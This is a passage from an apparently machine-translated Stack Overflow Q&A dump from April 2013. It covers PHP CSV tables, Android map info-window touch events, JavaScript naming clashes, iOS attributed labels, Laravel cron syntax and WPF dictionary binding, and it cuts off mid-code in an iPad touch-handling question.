table thead tr th{font-weight:bold;padding:2px;margin:1px;border:1px solid black;background-color:blue;color:white;}
table tbody tr td{margin:1px;padding:2px;border:1px solid black;}
</style>
</head>
<body>
<div>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="GET">
<select name="filterColumn">
<?php foreach($head as $i=>$h){echo sprintf('<option value="%s">%s</option>',$i,htmlentities($h));} ?>
</select>
<input type="text" name="filterValue" place-holder="filter" value="" />
<input type="submit" value="Filter" />
</form>
</div>
<hr />
<?php

echo '<table>';
echo '<thead><tr><th>'.implode('</th><th>',$head).'</th></tr></thead>';
echo '<tbody>';
foreach($rows as $row)
{
    if(defined('FILTER_COLUMN')&&defined('FILTER_VALUE'))
    {
        if(strpos($row[FILTER_COLUMN],FILTER_VALUE)===false)continue;
    }
echo '<tr><td>'.implode('</td><td>',$row).'</td></tr>';
}
echo '</tbody>';
echo '</table>';
?>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-09T10:26:06.127

如果名称不是必需的，则简单地不显示一行：

```
<?php    
   // get the CSV data as an array from the remote URL
   $lines = file('https://docs.google.com/spreadsheet/pub?key=0AgzUC4MxdChJdFIyMHFUZ21PS053b3Z1OHFnbHJwYVE&single=true&gid=0&output=csv');

   // get rid of header row    
   $headers = array_shift($lines);

   // Loop through data- therer is only one line hear
   foreach ($lines as $line) {    
       $ldata =  explode(',', trim($line)); // split row to its own array of elements
       if ($ldata[0] == '') break; // an empty line means we are done, so exit the foreach loop

       if($ldata[1] == $var_with_required_name) {

           // now we can just output the information as an HTML list, referencing the appropriate array items    
           echo '<li>Sr No.  <strong>' . $ldata[0] . '</strong></li><li>Name  <strong>' . $ldata[1] . '</strong></li><li>Gossip <strong>' . $ldata[2] . '</strong></li>';
       }
   }
?> 
```

# iphone - iOS 上的谷歌 3d 地图

> ID：15899302
> 
> 赞同：0
> 
> 时间：2013-04-09T10:17:58.050
> 
> 标签：iphone, ios, objective-c, google-maps

我必须创建一个地图视图，我可以在其中向用户显示从起始位置到结束位置的方向，就像我们通过看起来像 3d 的谷歌地图一样。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-14T18:44:51.890

Google 提供了 SDK，它为我们提供了很多选择...

[https://developers.google.com/maps/documentation/ios/start](https://developers.google.com/maps/documentation/ios/start)

谢谢

# android - dispatchTouchEvent 触发点击事件不起作用？

> ID：15899304
> 
> 赞同：1
> 
> 时间：2013-04-09T10:18:02.093
> 
> 标签：android, touch-event, android-maps-v2

我想让google map v2 infowindow成为一个生活视图，所以我将SupportMapFragment包装在自定义RelativeLayout中，如下所示：

**R.layout.info_window：**

```
<?xml version="1.0" encoding="utf-8"?>
<com.Amazing.GoogleMapV2.MapWrapperLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:id="@+id/map_relative_layout">
    <fragment
            android:id="@+id/map"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            class="com.google.android.gms.maps.SupportMapFragment" />
</com.Amazing.GoogleMapV2.MapWrapperLayout> 
```

我覆盖了 dispatchTouchEvent，将 motionEvent 位置偏移到 infowindow 视图坐标，然后将 dispatchTouchEvent 到 infoWindow: **MapWrapperLayout:**

```
public class MapWrapperLayout extends RelativeLayout {
    /**
     * Reference to a GoogleMap object
     */
    private GoogleMap map;

    /**
     * Vertical offset in pixels between the bottom edge of our InfoWindow
     * and the marker position (by default it's bottom edge too).
     * It's a good idea to use custom markers and also the InfoWindow frame,
     * because we probably can't rely on the sizes of the default marker and frame.
     */
    private int bottomOffsetPixels;

    /**
     * A currently selected marker
     */
    private Marker marker;

    /**
     * Our custom view which is returned from either the InfoWindowAdapter.getInfoContents
     * or InfoWindowAdapter.getInfoWindow
     */
    private View infoWindow;

    public MapWrapperLayout(Context context) {
        super(context);
    }

    public MapWrapperLayout(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    public MapWrapperLayout(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
    }

    /**
     * Must be called before we can route the touch events
     */
    public void init(GoogleMap map, int bottomOffsetPixels) {
        this.map = map;
        this.bottomOffsetPixels = bottomOffsetPixels;
    }

    /**
     * Best to be called from either the InfoWindowAdapter.getInfoContents
     * or InfoWindowAdapter.getInfoWindow.
     */
    public void setMarkerWithInfoWindow(Marker marker, View infoWindow) {
        this.marker = marker;
        this.infoWindow = infoWindow;
    }

    @Override
    public boolean dispatchTouchEvent(MotionEvent ev) {
        // Make sure that the infoWindow is shown and we have all the needed references
        if (marker != null && marker.isInfoWindowShown() && map != null && infoWindow != null) {
            // Get a marker position on the screen
            Point point = map.getProjection().toScreenLocation(marker.getPosition());

            // Make a copy of the MotionEvent and adjust it's location
            // so it is relative to the infoWindow left top corner
            MotionEvent copyEv = MotionEvent.obtain(ev);
            copyEv.offsetLocation(
                    -point.x + (infoWindow.getWidth() / 2),
                    -point.y + infoWindow.getHeight() + bottomOffsetPixels);
            Log.e("~~~~~~~~~~dispatchTouchEvent  copyEv", copyEv.toString());

            //Dispatch the adjusted MotionEvent to the infoWindow
            if (infoWindow.dispatchTouchEvent(copyEv)) {
                Log.e("infoWindow.dispatchTouchEvent(copyEv)", "True");
                Log.e("~~~~~~~~~~dispatchTouchEvent  point", point.toString());
                Log.e("~~~~~~~~~~dispatchTouchEvent  ev", ev.toString());
                Log.e("~~~~~~~~~~dispatchTouchEvent  copyEv", copyEv.toString());
                return true;
            }
        }
        // If the infoWindow consumed the touch event, then just return true.
        // Otherwise pass this event to the super class and return it's result
        return super.dispatchTouchEvent(ev);
    }
} 
```

**R.layout.info_window：**

```
<?xml version="1.0" encoding="utf-8"?>

<LinearLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:gravity="center_vertical">

    <LinearLayout
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:layout_marginRight="10dp">

        <TextView
                android:id="@+id/title"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:textSize="18sp"
                android:text="Title"/>

        <TextView
                android:id="@+id/snippet"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="snippet"/>

    </LinearLayout>

    <Button
            android:id="@+id/button"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Button" android:clickable="true" android:enabled="true" android:focusable="true"
            android:focusableInTouchMode="true"/>

</LinearLayout> 
```

并且 MainActivity 将 R.layout.info_window 和 setOnClickListener 膨胀到 info_window 上的 infoButton： **MainActivity：**

```
 public class MainActivity extends SherlockFragmentActivity {
        private ViewGroup infoWindow;
        private TextView infoTitle;
        private TextView infoSnippet;
        private Button infoButton;
    //    private OnInfoWindowElemTouchListener infoButtonListener;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.main);

            final SupportMapFragment mapFragment =
                    (SupportMapFragment)getSupportFragmentManager().findFragmentById(R.id.map);
            final MapWrapperLayout mapWrapperLayout =
                    (MapWrapperLayout)findViewById(R.id.map_relative_layout);
            final GoogleMap map = mapFragment.getMap();

            // MapWrapperLayout initialization
            // 39 - default marker height
            // 20 - offset between the default InfoWindow bottom edge and it's content bottom edge
            mapWrapperLayout.init(map, getPixelsFromDp(this, 39 + 20));

            // We want to reuse the info window for all the markers,
            // so let's create only one class member instance
            this.infoWindow = (ViewGroup)getLayoutInflater().inflate(R.layout.info_window, null);
            this.infoTitle = (TextView)infoWindow.findViewById(R.id.title);
            this.infoSnippet = (TextView)infoWindow.findViewById(R.id.snippet);
            this.infoButton = (Button)infoWindow.findViewById(R.id.button);
            // Setting custom OnTouchListener which deals with the pressed state
            // so it shows up
    //        this.infoButtonListener = new OnInfoWindowElemTouchListener(infoButton,
    //                R.drawable.btn_normal, R.drawable.btn_pressed)
    //        {
    //            @Override
    //            protected void onClickConfirmed(View v, Marker marker) {
    //                // Here we can perform some action triggered after clicking the button
    //                Toast.makeText(MainActivity.this, marker.getTitle() + "'s button clicked!", Toast.LENGTH_SHORT).show();
    //            }
    //        };
            this.infoButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    Toast.makeText(MainActivity.this, "~~~~~ Button clicked!", Toast.LENGTH_SHORT).show();
                }
            });

            map.setInfoWindowAdapter(new GoogleMap.InfoWindowAdapter() {
                @Override
                public View getInfoWindow(Marker marker) {
                    return null;
                }

                @Override
                public View getInfoContents(Marker marker) {
                    // Setting up the infoWindow with current's marker info
                    infoTitle.setText(marker.getTitle());
                    infoSnippet.setText(marker.getSnippet());
    //                infoButtonListener.setMarker(marker);

                    // We must call this to set the current marker and infoWindow references
                    // to the MapWrapperLayout
                    mapWrapperLayout.setMarkerWithInfoWindow(marker, infoWindow);
                    return infoWindow;
                }
            });

            // Let's add a couple of markers
            map.animateCamera(CameraUpdateFactory.newLatLng(new LatLng(50.08, 14.43)));
            map.addMarker(new MarkerOptions()
                    .title("Prague")

   .snippet("Czech Republic")
                .position(new LatLng(50.08, 14.43)));

        map.addMarker(new MarkerOptions()
                .title("Paris")
                .snippet("France")
                .position(new LatLng(48.86,2.33)));

        Marker m = map.addMarker(new MarkerOptions()
                .title("London")
                .snippet("United Kingdom")
                .position(new LatLng(51.51,-0.1)));
        m.showInfoWindow();
    }

    public static int getPixelsFromDp(Context context, float dp) {
        final float scale = context.getResources().getDisplayMetrics().density;
        return (int)(dp * scale + 0.5f);
    }
} 
```

这些代码的行为很奇怪，当活动 onResume() 不是立即调用时，按钮的 onClick 将被调用，但 onTouch 事件是立即调用。为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-17T18:18:18.850

我认为这可能与其他问题有关。

[Runnable 发布成功但没有运行](https://stackoverflow.com/questions/4083787/runnable-is-posted-successfully-but-not-run)

问题是在 View.onTouchEvent （ MotionEvent 事件）中，当 ACTION_UP 事件发生时，而不是仅仅调用 performClick() Android 调用 post() 与 PerformClick 可运行。此可运行文件不会运行，因为您的视图未附加到窗口。

要解决此问题，只需将视图添加到 MapWrapperLayout。您甚至可以将其移出屏幕，以免影响地图的外观。

```
public void setMarkerWithInfoWindow ( Marker marker, View infoWindow )
{
    this.marker = marker;

    if ( this.infoWindow != null )
    {
        this.removeView ( this.infoWindow );
    }
    this.infoWindow = infoWindow;

    // Force the view to render WAY off screen, so we don't actually see it.
    RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams (
            LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT );
    params.leftMargin = 100000;

    this.addView ( infoWindow, params );
} 
```

# javascript - IAgree 函数上的 Javascript 不当行为

> ID：15899306
> 
> 赞同：0
> 
> 时间：2013-04-09T10:18:13.403
> 
> 标签：javascript, html, function, runtime-error

我有以下代码：

```
function iAgree(){
    alert("Hello");
    jQuery('#openAccount').hide();
    jQuery('#submitDetails').show();
} 
```

我使用以下方法调用它：

```
<div class="openAccWraper">
  <div class="openAccDetail"> </div>
  <div class="questionContact">
    <input type="checkbox" name="iAgree" id="iAgree" value="1" />
  </div>
</div>
  <a href="#" onclick="iAgree();"><img src="img/btnSubmitDet.png" border="0" /></a> 
```

我收到以下错误：

```
Uncaught TypeError: object is not a function 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T16:52:20.007

我认为问题可能在于 iAgree 也是 id，并且 IIRC 一些（全部？）浏览器定义了与 id 相同的全局名称（如果可能作为标识符）。所以，iAgree() 尝试调用 DOM 对象，显然失败了；它还解释了为什么重命名可以解决它。

要检查是否是这种情况，请放置 onclick="alert(iAgree); iAgree();" 并查看它是否警告功能或 InputElement。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T11:38:10.497

我认为问题在于您的代码没有正确加载到页面上。如果您将函数代码包装在 html 的**head**或**body**标记中，您的代码应该可以工作。例如

```
<body>
   <!-- html -->
   <!-- load your script at the bottom of the body -->
<script src="jquery.js" type="text/javascript"></script>  
<script type="text/javascript">
    function iAgree(){
        alert("Hello");
        .........
     }
</script>
</body>
Or
<body>
   <!-- html -->
   <!-- load your script at the bottom of the body-->
   <script src="jquery.js" type="text/javascript"></script>
   <script src="iAgree.js" type="text/javascript"></script>
</body> 
```

这是一个最小的工作小提琴[http://jsfiddle.net/SZYH3/2/](http://jsfiddle.net/SZYH3/2/)。

# iphone - 一个UILabel中的不同颜色

> ID：15899309
> 
> 赞同：1
> 
> 时间：2013-04-09T10:18:18.473
> 
> 标签：iphone, ios, objective-c, uilabel

这就是我想要做的。我有一个 UILabel，但 UILabel 中的一个词应该是红色的。经过一番研究，我找到了[TTTAttributedLabel](https://github.com/mattt/TTTAttributedLabel/) 但我无法理解它。因为我的标签是多语言的，所以这很困难，因为他们都在使用 NSRange。

这是我的标签。

```
In dutch:
      Het 25m bad is vandaag **bezet** van 12:00 tot 15:00
In English
      The 25m pool is today **occupied** from 12:00 till 15:00 
```

我需要以红色粗体显示的文本。

有谁能够帮我？

亲切的问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:33:54.950

例如，您可以使用此代码段来获取`NSRange`“occupied”或“bezet”的位置：

```
NSRange occupiedRange = [str rangeOfString:NSLocalizedString(@"occupied", @"")];
if (occupiedRange.location == NSNotFound) {
    NSLog(@"Not found");
} else {
    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T12:13:27.070

希望下面的代码片段对你有用

```
-(NSAttributedString*)configureToAttributedwithString:(NSString*)str
{
NSRange occupiedRange = [str rangeOfString:NSLocalizedString(@"occupied", @"")];
if (occupiedRange.location == NSNotFound)
{
    NSLog(@"Not found");
    NSAttributedString *attRStr = [[[NSAttributedString alloc] initWithString:str] autorelease];

    return (attRStr);
}
else
{
    NSString *string = [str substringToIndex:occupiedRange.location];

    str = [str substringFromIndex:occupiedRange.location];

    NSString *tarGetString = [str substringToIndex:occupiedRange.length];

    str = [str substringFromIndex:occupiedRange.length];

    CGColorRef colorRed = [[UIColor colorWithRed:1.0 green:0.0 blue:0.0 alpha:1.0] CGColor];
    NSNumber *underline = [NSNumber numberWithInt:kCTUnderlineStyleSingle];
    CTFontRef sysUITargetFont = CTFontCreateUIFontForLanguage(kCTFontUIFontEmphasizedSystem,20.0, NULL);
    NSDictionary *attributesDictTarget = [NSDictionary dictionaryWithObjectsAndKeys:
                                          (id)underline, (id)kCTUnderlineStyleAttributeName,
                                          colorRed, (id)kCTForegroundColorAttributeName,
                                          colorRed, (id)kCTStrokeColorAttributeName,nil];

    CGColorRef colorBlack = [[UIColor colorWithRed:0.0 green:0.0 blue:0.0 alpha:1.0] CGColor];
    CTFontRef sysUIDefaultFont = CTFontCreateUIFontForLanguage(kCTFontUIFontMessage,20.0, NULL);
    NSDictionary *attributesDictDefault = [NSDictionary dictionaryWithObjectsAndKeys:
                                           colorBlack, (id)kCTStrokeColorAttributeName,nil];

    NSMutableAttributedString *attMString = [[NSMutableAttributedString alloc] initWithString:string attributes:attributesDictDefault];

    NSAttributedString *stringToDraw = [[NSAttributedString alloc] initWithString:tarGetString
                                                                       attributes:attributesDictTarget];

    [attMString appendAttributedString:stringToDraw];

    NSAttributedString *stringRest = [[NSAttributedString alloc] initWithString:str
                                                                     attributes:attributesDictDefault];

    [attMString appendAttributedString:stringRest];

    NSLog(@"check %@", [attMString string]);

    return (attMString);
}
} 
```

# objective-c - 我在哪里可以找到 Objective-C 2.0 的 EBNF 语法

> ID：15899313
> 
> 赞同：4
> 
> 时间：2013-04-09T10:18:25.213
> 
> 标签：objective-c, grammar

我正在学习Objective-C。我想知道它的语法细节。那么在哪里可以找到Objective-C 2.0的EBNF语法呢？我试图在[http://developer.apple.com/library/mac/navigation/](http://developer.apple.com/library/mac/navigation/)上搜索， 但找不到有用的信息。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T14:08:32.393

我在这个页面上找到了详细的 Objective-C 2.0 语法： [https ://github.com/iamdc/Objective-C-Grammar/blob/master/ObjC.Grm](https://github.com/iamdc/Objective-C-Grammar/blob/master/ObjC.Grm)

# android - Android - 包含多行文本视图的列表视图行

> ID：15899314
> 
> 赞同：0
> 
> 时间：2013-04-09T10:18:27.980
> 
> 标签：android, android-layout, android-listview

正如标题所说，我有一个列表视图，并且该行包含一个包含多行的文本视图。由于它有多条线，它的行为就像图片显示的那样。

基本上它应该只显示第一行，但是下面的行正在向上推。这只发生在冰淇淋三明治和果冻豆中。姜面包看起来不错。

![图片](https://i.stack.imgur.com/Zkaok.jpg)

这是该行的 XML 代码：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/main_list_row"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="horizontal" >
        <TextView
            android:focusableInTouchMode="false"
            android:clickable="false"
            android:focusable="false"
            android:id="@+id/item_yyyy"
            android:gravity="center"
            android:textIsSelectable="true"
            android:layout_width="0dp"
            android:layout_height="23dp"
            android:layout_weight=".14"
            android:textSize="15sp" />
        <TextView
            android:focusableInTouchMode="false"
            android:clickable="false"
            android:focusable="false"
            android:id="@+id/item_dd"
            android:gravity="center"
            android:textIsSelectable="true"
            android:layout_width="0dp"
            android:layout_height="23dp"
            android:layout_weight=".11"
            android:textSize="15sp" />
        <TextView
            android:focusableInTouchMode="false"
            android:clickable="false"
            android:focusable="false"
            android:id="@+id/item_mm"
            android:gravity="center"
            android:textIsSelectable="true"
            android:layout_width="0dp"
            android:layout_height="23dp"
            android:layout_weight=".11"
            android:textSize="15sp" />
        <TextView
            android:focusableInTouchMode="false"
            android:clickable="false"
            android:focusable="false"
            android:id="@+id/item_state"
            android:gravity="center"
            android:textIsSelectable="true"
            android:layout_width="0dp"
            android:layout_height="23dp"
            android:layout_weight=".13"
            android:textSize="15sp" />
        <TextView
            android:focusableInTouchMode="false"
            android:clickable="false"
            android:focusable="false"
            android:id="@+id/item_pu"
            android:gravity="center"
            android:textIsSelectable="true"
            android:layout_width="0dp"
            android:layout_height="23dp"
            android:layout_weight=".11"
            android:textSize="15sp" />
        <TextView
            android:focusableInTouchMode="false"
            android:clickable="false"
            android:focusable="false"
            android:id="@+id/item_detailes"
            android:paddingLeft="5dp"
            android:textIsSelectable="true"
            android:layout_width="0dp"
            android:layout_height="23dp"
            android:layout_weight=".40"
            android:textSize="15sp" />
</LinearLayout> 
```

我尝试在行的 xml 中弄乱 android:padding 但没有结果。

我能做些什么？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:57:58.550

![在此处输入图像描述](https://i.stack.imgur.com/5scXy.png)

尝试添加`android:weightSum`您的布局。

如果我的列表有 3 列，那么在 peren 布局中我添加`android:weightSum="3"`

我在所有孩子中添加

```
android:layout_width="0dp"
android:layout_height="wrap_content"
android:layout_weight="1" 
```

检查以下列表行文件的代码：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="horizontal"
    android:weightSum="3" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:text="Large Text"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <TextView
        android:id="@+id/textView2"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:text="Large Text"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <TextView
        android:id="@+id/textView3"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:text="Large Text"
        android:textAppearance="?android:attr/textAppearanceLarge" />

</LinearLayout> 
```

如果你想让它居中，然后`android:gravity="center"`在 perent 线性布局中使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T20:16:46.200

我用这行代码修复了它：android:singleLine="true"。现在看起来没问题：

![在此处输入图像描述](https://i.stack.imgur.com/UWulf.jpg)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-24T12:59:22.090

如果在另一个地方你有一个多行文本和相同的问题，你可以使用

```
android:layout_gravity="fill" 
```

# php - 使用参数将 Laravel 任务添加到 cron

> ID：15899315
> 
> 赞同：0
> 
> 时间：2013-04-09T10:18:30.610
> 
> 标签：php, parameters, cron, laravel, environment

我想将 Laravel 任务添加到 cron 中，这是我用来从命令行运行它的（并成功运行）

```
php artisan cron:hourly --env=staging 
```

翻译成cron：

```
/usr/bin/php -q /home/usr/public_html/staging/artisan cron:hourly --env=staging 
```

我假设参数有问题，`--env=staging`因为执行 cron 时出现错误（没有此参数，我无法在暂存环境中运行任务）：

`Uncaught exception 'PDOException' with message 'SQLSTATE[HY000] [1045] Access denied for user ''@'localhost'`

谁能解释我在 cron 中执行 laravel 任务的正确语法？

**更新**

实际上，只有当我将 cron 命令放在 SH 脚本中时，才会出现问题。由于未知原因，脚本未发送“--env=staging”参数，并以所描述的错误结束。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:47:02.507

错误消息表明环境设置不正确。我不确定为什么会出现问题。

请参阅我的 crontab 文件，以供参考。这适用于我的 debian linux 安装。还要注意`-f`标志，这可能是问题所在。

```
0 23 * * * /usr/bin/php -q -f /home/usr/demo/public_html/artisan mytask --env=live 
```

在我的服务器上，php-cli 确实输出了所有 PHP 通知，因此向我发送了很多电子邮件。因此，您可能应该检查 PHP-Notices 和/或通过设置禁用它们`error_reporting(E_ERROR);`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T23:26:28.470

该错误表明没有为登台环境配置数据库连接。带有 ''@'localhost' 的位应包含数据库连接的用户名。即：'a_db_user'@'localhost'。因为它是空的，我们可以看出没有配置数据库用户。数据库配置需要在 application/config/database.php 或 application/config/staging/database.php 中设置

# format - Uncrustify 以对齐级联的“如果条件”

> ID：15899317
> 
> 赞同：1
> 
> 时间：2013-04-09T10:18:33.533
> 
> 标签：format, readability, uncrustify, universalindentgui

UniversalIndentGUI 和 Uncrustify 的组合对我来说非常有用，并且为我节省了大量时间来格式化 C 源代码。但我有一个额外的小问题，想知道是否有人可以提供帮助。

是否可以从以下条件纠正组合的 if 条件：

```
if ( (a > 0) 
     && (b > 0) 
     && (c > 0))
{
...
} 
```

至

```
if (     (a > 0) 
      && (b > 0) 
      && (c > 0)
    )
{
...
} 
```

如果将更多条件嵌入在一起，这可能在一定程度上有助于代码的可读性。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-18T17:11:48.550

我怀疑是否有这样的设置。unrustify 提供它是个好主意。

一个不太好的建议是定义一个宏或函数：

```
#define ___(arg)  arg 
```

然后你可以有：

```
if ( ___( a > 0 )
     && ( b > 0 )
   )
{
} 
```

但请注意标准保留以“_”开头的宏。看：

[在 C++ 标识符中使用下划线的规则是什么？](https://stackoverflow.com/questions/228783/what-are-the-rules-about-using-an-underscore-in-a-c-identifier)

# c# - 绑定一些引用的对象属性

> ID：15899318
> 
> 赞同：1
> 
> 时间：2013-04-09T10:18:38.120
> 
> 标签：c#, wpf, binding

我有一本字典：

```
private Dictionary<int, ICar> _ICarsDic; 
```

对象 ICar 实际上包含另一个对象列表：

```
public interface ICar 
{
    int carId { get; set; }
    string carName { get; set; }
    Dictionnary<int,IBrandsDetails> brandsDetails { get; set; }
} 
```

我将此 CarsDic 字典绑定到 DataGrid （之前将其转换为 IEnumerable 但这不是问题的重点，所以这里没有显示）。

```
<DataGrid Name="Cars"
    ItemsSource="{Binding}" 
    SelectedItem="{Binding RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type UserControl}, AncestorLevel=2}, Path=SelectedCar, Mode=TwoWay}">
    <DataGrid.Columns>
        <DataGridTextColumn Header="Car Id" Binding="{Binding CarId}" IsReadOnly="True" />
        <DataGridTextColumn Header="Car Name" Binding="{Binding carName}" IsReadOnly="True" />
    </DataGrid.Columns> 
```

我的问题是我还想显示 BrandsDetails 中的一些数据（所有汽车通用），例如徽标。这个合成器虽然不起作用：

```
<DataGridTextColumn Header="Full Name" Binding="{Binding BrandsDetails.Logo}" IsReadOnly="True" /> 
```

预先感谢您的回答！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:32:17.330

我认为以下链接将解决您的问题

[http://www.dev102.com/2008/03/07/binding-a-wpf-control-to-a-dictionary/](http://www.dev102.com/2008/03/07/binding-a-wpf-control-to-a-dictionary/)

引用

绑定到字典可能很棘手。

这听起来很简单，但在第一次尝试时它永远不会奏效。通常，当您第一次运行您的应用程序时，您看到的不是为项目创建的漂亮模板，而是看起来像一对键和值的东西。您的绑定工作正常，您只是没有考虑绑定到什么。字典中的每个项目都是一对（键，值），这正是您作为绑定项目得到的。您有两种处理方式，您可以更改 Binding 表达式的标记以包含对 Value 的引用：

```
<ComboBox.ItemTemplate>
             <DataTemplate>
                 <StackPanel Orientation="Horizontal">
                     <TextBlock Text="{Binding Value.Text}"></TextBlock>
                     <TextBlock> = </TextBlock>
                     <TextBlock Text="{Binding Value.Value}"></TextBlock>
                 </StackPanel>
             </DataTemplate>
         </ComboBox.ItemTemplate> 
```

或者您可以更改控件的绑定表达式以引用字典的 Values 属性：

```
 <ComboBox Height="23" Margin="0,14,9,0" Name="comboBox1"
                  VerticalAlignment="Top" SelectedValuePath="Key"
                  ItemsSource="{Binding Items.Values}"
                  HorizontalAlignment="Right" Width="120"> 
```

现在您的控件已绑定到字典，万岁！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:35:11.223

对于这个答案，我将假设您的 DataGrid 绑定到包含 ICar 实现对象的 Dictionary （您的确切绑定既不清楚又过于复杂）。

绑定失败的原因`BrandsDetails`是属性实际上是 a `Dictionary`，并且您知道它没有`Logo`属性。理想情况下，DataGrid 列应该有一个数据模板，它是某种重复器控件，如 ListView 或另一个 DataGrid，或者使用 MultiBinding 和转换器 - 这是您能够从该属性显示完整 Dictionary 的唯一方法。否则，您将[需要在绑定路径中](https://stackoverflow.com/questions/4511619/wpf-bind-to-indexer) [使用](http://geekswithblogs.net/btudor/archive/2009/05/31/132526.aspx) [索引](http://sachabarbs.wordpress.com/2008/03/29/wpf-binding-to-individual-collection-items-but-not-in-a-itemscontrol/)来挑选单个项目。

# iphone - 触摸事件方法没有在 ipad 的 UIPopOverViewController 中调用？

> ID：15899319
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:18:48.087
> 
> 标签：iphone, objective-c, ios5, ios4, ios6

嗨，我正在使用`UIPopOverViewController`ipad 应用程序。我调用了触摸事件方法，当然这些方法在触摸时会自动调用。但这些都是`UIView`方法。我的问题是我在那个图像视图中有 popOverViewController。当我触摸该图像视图时，不会调用委托方法。

我用另一种方式来做，它是我子视图中的图像视图`UIView`，在这种情况下，代表被调用。当我将该图像视图分配给 PopOverView 时，不会调用代表。

这是示例代码：

```
 if(popOverViewBool) {

 signatureImageView.image=nil;
 [currentTextField resignFirstResponder];
 [currentTextView resignFirstResponder];
 red = 0.0/255.0;
 green = 0.0/255.0;
 blue = 0.0/255.0;
 brush = 2.2;//10.0
 opacity = 1.0;

 UIViewController* popOverVCont = [[UIViewController alloc] init];
 popOverVCont.view=myView;
 popOverVCont.contentSizeForViewInPopover =CGSizeMake(590, 350);

 self.popoverController = [[UIPopoverController alloc]
 initWithContentViewController:popOverVCont];

 popoverController.delegate = self;

 [popoverController presentPopoverFromRect:CGRectMake(-137, 460, 320, 10) inView:self.view permittedArrowDirections:UIPopoverArrowDirectionDown animated:YES];
 popOverViewBool=NO;
 }
 else
 {
 [popoverController presentPopoverFromRect:CGRectMake(-137, 460, 320, 10) inView:self.view permittedArrowDirections:UIPopoverArrowDirectionDown animated:YES];
 }

- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {

mouseSwiped = NO;
UITouch *touch = [touches anyObject];
//lastPoint = [touch locationInView:self.view];
lastPoint = [touch locationInView:self.drawSignView];
}

- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event {

mouseSwiped = YES;
UITouch *touch = [touches anyObject];
//CGPoint currentPoint = [touch locationInView:self.view];
CGPoint currentPoint = [touch locationInView:self.drawSignView];

//UIGraphicsBeginImageContext(self.view.frame.size);
UIGraphicsBeginImageContext(self.drawSignView.frame.size);

//[self.tempDrawImage.image drawInRect:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height)];
[self.tempDrawImage.image drawInRect:CGRectMake(0, 0, self.drawSignView.frame.size.width, self.drawSignView.frame.size.height)];
CGContextMoveToPoint(UIGraphicsGetCurrentContext(), lastPoint.x, lastPoint.y);
CGContextAddLineToPoint(UIGraphicsGetCurrentContext(), currentPoint.x, currentPoint.y);
CGContextSetLineCap(UIGraphicsGetCurrentContext(), kCGLineCapRound);
CGContextSetLineWidth(UIGraphicsGetCurrentContext(), brush );
CGContextSetRGBStrokeColor(UIGraphicsGetCurrentContext(), red, green, blue, 1.0);
CGContextSetBlendMode(UIGraphicsGetCurrentContext(),kCGBlendModeNormal);

CGContextStrokePath(UIGraphicsGetCurrentContext());
self.tempDrawImage.image = UIGraphicsGetImageFromCurrentImageContext();
[self.tempDrawImage setAlpha:opacity];
UIGraphicsEndImageContext();

lastPoint = currentPoint;
 }

 - (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event {

if(!mouseSwiped)
{
    //UIGraphicsBeginImageContext(self.view.frame.size);
    UIGraphicsBeginImageContext(self.drawSignView.frame.size);

    //[self.tempDrawImage.image drawInRect:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height)];
    [self.tempDrawImage.image drawInRect:CGRectMake(0, 0, self.drawSignView.frame.size.width, self.drawSignView.frame.size.height)];
